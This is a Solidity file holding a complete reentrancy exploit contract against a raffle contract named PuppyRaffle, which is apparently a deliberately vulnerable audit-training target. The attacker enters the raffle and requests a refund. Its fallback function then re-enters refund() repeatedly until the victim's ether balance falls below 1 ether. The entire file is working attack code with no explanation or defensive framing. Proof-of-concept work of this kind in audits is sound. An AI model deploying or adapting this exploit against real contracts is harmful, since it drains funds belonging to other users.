// SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;

import {PuppyRaffle} from "./PuppyRaffle.sol";

contract ReEntrancyAttacker {

    PuppyRaffle public puppyRaffleVictim;

    constructor(PuppyRaffle _puppyRaffleVictim) {
        puppyRaffleVictim = _puppyRaffleVictim;
    }

    fallback() external payable{
        if (address(puppyRaffleVictim).balance >= 1 ether){
            uint256 playerIndex = puppyRaffleVictim.getActivePlayerIndex(address(this));
            puppyRaffleVictim.refund(playerIndex);
        }
    }

    function attack(PuppyRaffle victimRaffleContract) public payable {
        address[] memory rafflePlayers = new address[](1);

        rafflePlayers[0] = address(this);

        victimRaffleContract.enterRaffle{value: victimRaffleContract.entranceFee() * 1}(rafflePlayers);
        uint256 playerIndex = puppyRaffleVictim.getActivePlayerIndex(address(this));
        victimRaffleContract.refund(playerIndex);
    }
}